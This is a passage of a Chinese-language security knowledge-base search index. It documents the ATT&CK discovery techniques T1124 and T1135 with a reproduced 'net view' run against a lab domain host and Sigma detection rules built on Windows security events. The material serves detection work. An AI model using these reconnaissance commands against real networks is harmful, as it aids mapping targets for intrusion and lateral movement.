\u7cfb\u7edf\u670d\u52a1\u53d1\u73b0 description: windows server 2016 references: tags: T1124 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\w32tm.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: w32tm /tz #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\w32tm.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d timeframe: last 5s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1124 https://attack.mitre.org/techniques/T1124/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/","text":"T1135-win-\u7f51\u7edc\u5171\u4eab\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u7f51\u7edc\u901a\u5e38\u5305\u542b\u5171\u4eab\u7684\u7f51\u7edc\u9a71\u52a8\u5668\u548c\u6587\u4ef6\u5939\uff0c\u4f7f\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u4e0d\u540c\u7cfb\u7edf\u4e0a\u7684\u6587\u4ef6\u76ee\u5f55\u3002 windows Windows\u7f51\u7edc\u4e0a\u7684\u6587\u4ef6\u5171\u4eab\u901a\u8fc7SMB\u534f\u8bae\u8fdb\u884c\u3002 Net\u53ef\u7528\u4e8e\u4f7f\u7528Net view\\remote system\u547d\u4ee4\u67e5\u8be2\u8fdc\u7a0b\u7cfb\u7edf\u4e2d\u7684\u53ef\u7528\u5171\u4eab\u9a71\u52a8\u5668\u3002\u5b83\u8fd8\u53ef\u7528\u4e8e\u4f7f\u7528\u7f51\u7edc\u5171\u4eab\u67e5\u8be2\u672c\u5730\u7cfb\u7edf\u4e0a\u7684\u5171\u4eab\u9a71\u52a8\u5668\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5bfb\u627e\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u5171\u4eab\u7684\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\uff0c\u4f5c\u4e3a\u8bc6\u522b\u4fe1\u606f\u6e90\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u4ee5\u6536\u96c6\u4f5c\u4e3a\u653b\u51fb\u7684\u524d\u5146\uff0c\u5e76\u8bc6\u522b\u53ef\u80fd\u611f\u5174\u8da3\u7684\u6a2a\u5411\u79fb\u52a8\u7cfb\u7edf\u3002 Mac \u5728Mac\u4e0a\uff0c\u53ef\u4ee5\u4f7f\u7528df-aH\u547d\u4ee4\u67e5\u770b\u672c\u5730\u5b89\u88c5\u7684\u5171\u4eab\u3002 \u4e91 \u4e91\u865a\u62df\u7f51\u7edc\u53ef\u80fd\u5305\u542b\u8fdc\u7a0b\u7f51\u7edc\u5171\u4eab\u6216\u6587\u4ef6\u5b58\u50a8\u670d\u52a1\uff0c\u653b\u51fb\u8005\u5728\u83b7\u5f97\u5bf9\u7cfb\u7edf\u7684\u8bbf\u95ee\u6743\u9650\u540e\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e9b\u670d\u52a1\u3002\u4f8b\u5982\uff0cAWS\u3001GCP\u548cAzure\u652f\u6301\u521b\u5efa\u7f51\u7edc\u6587\u4ef6\u7cfb\u7edf\uff08NFS\uff09\u5171\u4eab\u548c\u670d\u52a1\u5668\u6d88\u606f\u5757\uff08SMB\uff09\u5171\u4eab\uff0c\u8fd9\u4e9b\u5171\u4eab\u53ef\u4ee5\u6620\u5c04\u5230\u7aef\u70b9\u6216\u57fa\u4e8e\u4e91\u7684\u7cfb\u7edf\u4e0a \u6d4b\u8bd5\u6848\u4f8b windows \u672c\u5730\u6267\u884cnet view\u76f8\u5173\u547d\u4ee4 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Windows\\system32>net view \\\\OWA2010SP3.0day.org \u5728 \\\\OWA2010SP3.0day.org \u7684\u5171\u4eab\u8d44\u6e90 \u5171\u4eab\u540d \u7c7b\u578b \u4f7f\u7528\u4e3a \u6ce8\u91ca ------------------------------------------------------------------------------- Address Disk \"Access to address objects\" CertEnroll Disk Active Directory \u8bc1\u4e66\u670d\u52a1\u5171\u4eab ExchangeOAB Disk OAB Distribution share GroupMetrics Disk \u90ae\u4ef6\u63d0\u793a\u7ec4\u5ea6\u91cf\u6807\u51c6\u53d1\u5e03\u70b9 NETLOGON Disk Logon server share SYSVOL Disk Logon server share \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows \u7f51\u7edc\u5171\u4eab\u53d1\u73b0\uff08windows server 2016\uff09\u68c0\u6d4b description: windows server 2016\u3001windows server 2012\u3001\u57df\u73af\u5883 tags: T1135 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net view \\\\* #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4703 #\u5df2\u8c03\u6574\u7528\u6237\u6743\u5229\u3002\u6ce8\u610f\u6b64\u4e8b\u4ef6\u5728windows server 2016\u4ee5\u4e0a\u7cfb\u7edf\u542f\u7528 selection3: EventID: 5158 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u7ed1\u5b9a\u672c\u5730\u7aef\u53e3\u3002\u6ce8\u610f\u6e90\u7aef\u53e3\u3001\u534f\u8bae selection4: EventID: 5156 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002 Direction: \u51fa\u7ad9 #\u7f51\u7edc\u4fe1\u606f>\u65b9\u5411\uff1a\u51fa\u7ad9 Sourceaddress: * #\u53d1\u8d77\u67e5\u8be2\u4e3b\u673aIP\u5730\u5740 Sourceport: * #\u548c5158\u4e8b\u4ef6\u6e90\u7aef\u53e3\u4e00\u81f4 Targetaddress: * #\u76ee\u6807IP\u5730\u5740 Targetport: 445 #\u76ee\u6807\u7aef\u53e3 Agreement: * #\u534f\u8bae\uff0c\u534f\u8bae\u548c5158\u4e00\u81f4 selection5: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b\u3002 Processname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d timeframe: last 5s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium title: windows \u7f51\u7edc\u5171\u4eab\u53d1\u73b0\uff08windows server 2012\uff09\u68c0\u6d4b description: windows server 2016\u3001windows server 2012\u3001\u57df\u73af\u5883 tags: T1135 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 5156 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002 Direction: \u5165\u7ad9 #\u7f51\u7edc\u4fe1\u606f>\u65b9\u5411\uff1a\u5165\u7ad9 Sourceaddress: * #\u88ab\u67e5\u8be2\u4e3b\u673aIP\u5730\u5740 Sourceport: 445 Targetaddress: * #\u76ee\u6807\u5730\u5740 \u53d1\u8d77\u67e5\u8be2\u7684\u4e3b\u673aIP\u5730\u5740 Targetport: * #\u76ee\u6807\u7aef\u53e3 \u53d1\u8d77\u67e5\u8be2\u7684\u4e3b\u673aIP\u7aef\u53e3 Agreement: * #\u534f\u8bae\uff0c\u548c2016\u4e0a5156\u4e8b\u4ef6\u30015158\u4e8b\u4ef6\u6d89\u53ca\u7684\u534f\u8bae\u4e00\u81f4 selection2: EventID: 4702 #\u4e3a\u65b0\u767b\u5f55\u5206\u914d\u4e86\u7279\u6b8a\u6743\u9650\u3002 selection3: EventID: 4624 #\u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002 logontype: 3 #\u767b\u9646\u7c7b\u578b\u4e3a3 Sourcenetworkaddress: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u7f51\u7edc\u5730\u5740 \u540c\u4e0a5156\u76ee\u6807\u5730\u5740 Sourceport: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u7f51\u7edc\u7aef\u53e3 \u540c\u4e0a5156\u76ee\u6807\u7aef\u53e3 Loginprocess: Kerberos #\u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u767b\u5f55\u8fdb\u7a0b Authenticationpackage: Kerberos #\u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305 selection4: EventID: 5140 #\u5df2\u8bbf\u95ee\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u3002 Objecttype: file #\u7f51\u7edc\u4fe1\u606f>\u5bf9\u8c61\u7c7b\u578b Sourceaddress: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u5730\u5740 \u540c\u4e0a5156\u76ee\u6807\u5730\u5740 Sourceport: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u7aef\u53e3 \u540c\u4e0a5156\u76ee\u6807\u7aef\u53e3 Sharename: \\\\*\\IPC$ #\u5171\u4eab\u4fe1\u606f>\u5171\u4eab\u540d selection5: EventID: 5140 #\u5df2\u8bbf\u95ee\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u3002 Objecttype: file #\u7f51\u7edc\u4fe1\u606f>\u5bf9\u8c61\u7c7b\u578b Sourceaddress: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u5730\u5740 \u540c\u4e0a5156\u76ee\u6807\u5730\u5740 Sourceport: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u7aef\u53e3 \u540c\u4e0a5156\u76ee\u6807\u7aef\u53e3 Sharename: \\\\*\\IPC$ #\u5171\u4eab\u4fe1\u606f>\u5171\u4eab\u540d Relativetargetname: srvsvc #\u5171\u4eab\u4fe1\u606f>\u76f8\u5bf9\u76ee\u6807\u540d\u79f0 timeframe: last 10s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium \u5efa\u8bae \u6ce8\u610f: \u8fd9\u91cc\u7684\u7aef\u53e3\u3001IP\u53ca\u534f\u8bae\u7528\u4e8e\u4e8b\u4ef6\u76f8\u4e92\u5173\u8054\uff0c\u4e0d\u505a\u5176\u4ed6\u7528\u5904 \u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u4e0e\u5408\u6cd5\u8fdc\u7a0b\u7cfb\u7edf\u53d1\u73b0\u76f8\u5173\u7684\u6b63\u5e38\u3001\u826f\u6027\u7cfb\u7edf\u548c\u7f51\u7edc\u4e8b\u4ef6\u53ef\u80fd\u4e0d\u5e38\u89c1\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u73af\u5883\u548c\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002 \u5728\u57fa\u4e8e\u4e91\u7684\u7cfb\u7edf\u4e2d\uff0c\u672c\u673a\u65e5\u5fd7\u8bb0\u5f55\u53ef\u7528\u4e8e\u6807\u8bc6\u5bf9\u67d0\u4e9b\u53ef\u80fd\u5305\u542b\u7cfb\u7edf\u4fe1\u606f\u7684api\u548c\u4eea\u8868\u677f\u7684\u8bbf\u95ee\u3002\u6839\u636e\u73af\u5883\u7684\u4f7f\u7528\u65b9\u5f0f\uff0c\u7531\u4e8e\u6b63\u5e38\u64cd\u4f5c\u671f\u95f4\u7684\u826f\u6027\u4f7f\u7528\uff0c\u4ec5\u6b64\u6570\u636e\u53ef\u80fd\u4e0d\u591f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1135 https://attack.mitre.org/techniques/T1135/","title":"T1135-win-\u7f51\u7edc\u5171\u4eab\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#t1135-win-","text":"","title":"T1135-win-\u7f51\u7edc\u5171\u4eab\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#attck","text":"\u7f51\u7edc\u901a\u5e38\u5305\u542b\u5171\u4eab\u7684\u7f51\u7edc\u9a71\u52a8\u5668\u548c\u6587\u4ef6\u5939\uff0c\u4f7f\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u4e0d\u540c\u7cfb\u7edf\u4e0a\u7684\u6587\u4ef6\u76ee\u5f55\u3002 windows Windows\u7f51\u7edc\u4e0a\u7684\u6587\u4ef6\u5171\u4eab\u901a\u8fc7SMB\u534f\u8bae\u8fdb\u884c\u3002 Net\u53ef\u7528\u4e8e\u4f7f\u7528Net view\\remote system\u547d\u4ee4\u67e5\u8be2\u8fdc\u7a0b\u7cfb\u7edf\u4e2d\u7684\u53ef\u7528\u5171\u4eab\u9a71\u52a8\u5668\u3002\u5b83\u8fd8\u53ef\u7528\u4e8e\u4f7f\u7528\u7f51\u7edc\u5171\u4eab\u67e5\u8be2\u672c\u5730\u7cfb\u7edf\u4e0a\u7684\u5171\u4eab\u9a71\u52a8\u5668\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5bfb\u627e\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u5171\u4eab\u7684\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\uff0c\u4f5c\u4e3a\u8bc6\u522b\u4fe1\u606f\u6e90\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u4ee5\u6536\u96c6\u4f5c\u4e3a\u653b\u51fb\u7684\u524d\u5146\uff0c\u5e76\u8bc6\u522b\u53ef\u80fd\u611f\u5174\u8da3\u7684\u6a2a\u5411\u79fb\u52a8\u7cfb\u7edf\u3002 Mac \u5728Mac\u4e0a\uff0c\u53ef\u4ee5\u4f7f\u7528df-aH\u547d\u4ee4\u67e5\u770b\u672c\u5730\u5b89\u88c5\u7684\u5171\u4eab\u3002 \u4e91 \u4e91\u865a\u62df\u7f51\u7edc\u53ef\u80fd\u5305\u542b\u8fdc\u7a0b\u7f51\u7edc\u5171\u4eab\u6216\u6587\u4ef6\u5b58\u50a8\u670d\u52a1\uff0c\u653b\u51fb\u8005\u5728\u83b7\u5f97\u5bf9\u7cfb\u7edf\u7684\u8bbf\u95ee\u6743\u9650\u540e\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e9b\u670d\u52a1\u3002\u4f8b\u5982\uff0cAWS\u3001GCP\u548cAzure\u652f\u6301\u521b\u5efa\u7f51\u7edc\u6587\u4ef6\u7cfb\u7edf\uff08NFS\uff09\u5171\u4eab\u548c\u670d\u52a1\u5668\u6d88\u606f\u5757\uff08SMB\uff09\u5171\u4eab\uff0c\u8fd9\u4e9b\u5171\u4eab\u53ef\u4ee5\u6620\u5c04\u5230\u7aef\u70b9\u6216\u57fa\u4e8e\u4e91\u7684\u7cfb\u7edf\u4e0a","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_1","text":"windows \u672c\u5730\u6267\u884cnet view\u76f8\u5173\u547d\u4ee4","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_3","text":"C:\\Windows\\system32>net view \\\\OWA2010SP3.0day.org \u5728 \\\\OWA2010SP3.0day.org \u7684\u5171\u4eab\u8d44\u6e90 \u5171\u4eab\u540d \u7c7b\u578b \u4f7f\u7528\u4e3a \u6ce8\u91ca ------------------------------------------------------------------------------- Address Disk \"Access to address objects\" CertEnroll Disk Active Directory \u8bc1\u4e66\u670d\u52a1\u5171\u4eab ExchangeOAB Disk OAB Distribution share GroupMetrics Disk \u90ae\u4ef6\u63d0\u793a\u7ec4\u5ea6\u91cf\u6807\u51c6\u53d1\u5e03\u70b9 NETLOGON Disk Logon server share SYSVOL Disk Logon server share \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_4","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#sigma","text":"title: windows \u7f51\u7edc\u5171\u4eab\u53d1\u73b0\uff08windows server 2016\uff09\u68c0\u6d4b description: windows server 2016\u3001windows server 2012\u3001\u57df\u73af\u5883 tags: T1135 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net view \\\\* #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4703 #\u5df2\u8c03\u6574\u7528\u6237\u6743\u5229\u3002\u6ce8\u610f\u6b64\u4e8b\u4ef6\u5728windows server 2016\u4ee5\u4e0a\u7cfb\u7edf\u542f\u7528 selection3: EventID: 5158 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u7ed1\u5b9a\u672c\u5730\u7aef\u53e3\u3002\u6ce8\u610f\u6e90\u7aef\u53e3\u3001\u534f\u8bae selection4: EventID: 5156 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002 Direction: \u51fa\u7ad9 #\u7f51\u7edc\u4fe1\u606f>\u65b9\u5411\uff1a\u51fa\u7ad9 Sourceaddress: * #\u53d1\u8d77\u67e5\u8be2\u4e3b\u673aIP\u5730\u5740 Sourceport: * #\u548c5158\u4e8b\u4ef6\u6e90\u7aef\u53e3\u4e00\u81f4 Targetaddress: * #\u76ee\u6807IP\u5730\u5740 Targetport: 445 #\u76ee\u6807\u7aef\u53e3 Agreement: * #\u534f\u8bae\uff0c\u534f\u8bae\u548c5158\u4e00\u81f4 selection5: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b\u3002 Processname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d timeframe: last 5s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium title: windows \u7f51\u7edc\u5171\u4eab\u53d1\u73b0\uff08windows server 2012\uff09\u68c0\u6d4b description: windows server 2016\u3001windows server 2012\u3001\u57df\u73af\u5883 tags: T1135 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 5156 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002 Direction: \u5165\u7ad9 #\u7f51\u7edc\u4fe1\u606f>\u65b9\u5411\uff1a\u5165\u7ad9 Sourceaddress: * #\u88ab\u67e5\u8be2\u4e3b\u673aIP\u5730\u5740 Sourceport: 445 Targetaddress: * #\u76ee\u6807\u5730\u5740 \u53d1\u8d77\u67e5\u8be2\u7684\u4e3b\u673aIP\u5730\u5740 Targetport: * #\u76ee\u6807\u7aef\u53e3 \u53d1\u8d77\u67e5\u8be2\u7684\u4e3b\u673aIP\u7aef\u53e3 Agreement: * #\u534f\u8bae\uff0c\u548c2016\u4e0a5156\u4e8b\u4ef6\u30015158\u4e8b\u4ef6\u6d89\u53ca\u7684\u534f\u8bae\u4e00\u81f4 selection2: EventID: 4702 #\u4e3a\u65b0\u767b\u5f55\u5206\u914d\u4e86\u7279\u6b8a\u6743\u9650\u3002 selection3: EventID: 4624 #\u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002 logontype: 3 #\u767b\u9646\u7c7b\u578b\u4e3a3 Sourcenetworkaddress: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u7f51\u7edc\u5730\u5740 \u540c\u4e0a5156\u76ee\u6807\u5730\u5740 Sourceport: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u7f51\u7edc\u7aef\u53e3 \u540c\u4e0a5156\u76ee\u6807\u7aef\u53e3 Loginprocess: Kerberos #\u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u767b\u5f55\u8fdb\u7a0b Authenticationpackage: Kerberos #\u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f>\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305 selection4: EventID: 5140 #\u5df2\u8bbf\u95ee\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u3002 Objecttype: file #\u7f51\u7edc\u4fe1\u606f>\u5bf9\u8c61\u7c7b\u578b Sourceaddress: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u5730\u5740 \u540c\u4e0a5156\u76ee\u6807\u5730\u5740 Sourceport: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u7aef\u53e3 \u540c\u4e0a5156\u76ee\u6807\u7aef\u53e3 Sharename: \\\\*\\IPC$ #\u5171\u4eab\u4fe1\u606f>\u5171\u4eab\u540d selection5: EventID: 5140 #\u5df2\u8bbf\u95ee\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u3002 Objecttype: file #\u7f51\u7edc\u4fe1\u606f>\u5bf9\u8c61\u7c7b\u578b Sourceaddress: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u5730\u5740 \u540c\u4e0a5156\u76ee\u6807\u5730\u5740 Sourceport: * #\u7f51\u7edc\u4fe1\u606f>\u6e90\u7aef\u53e3 \u540c\u4e0a5156\u76ee\u6807\u7aef\u53e3 Sharename: \\\\*\\IPC$ #\u5171\u4eab\u4fe1\u606f>\u5171\u4eab\u540d Relativetargetname: srvsvc #\u5171\u4eab\u4fe1\u606f>\u76f8\u5bf9\u76ee\u6807\u540d\u79f0 timeframe: last 10s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_6","text":"\u6ce8\u610f: \u8fd9\u91cc\u7684\u7aef\u53e3\u3001IP\u53ca\u534f\u8bae\u7528\u4e8e\u4e8b\u4ef6\u76f8\u4e92\u5173\u8054\uff0c\u4e0d\u505a\u5176\u4ed6\u7528\u5904 \u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u4e0e\u5408\u6cd5\u8fdc\u7a0b\u7cfb\u7edf\u53d1\u73b0\u76f8\u5173\u7684\u6b63\u5e38\u3001\u826f\u6027\u7cfb\u7edf\u548c\u7f51\u7edc\u4e8b\u4ef6\u53ef\u80fd\u4e0d\u5e38\u89c1\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u73af\u5883\u548c\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002 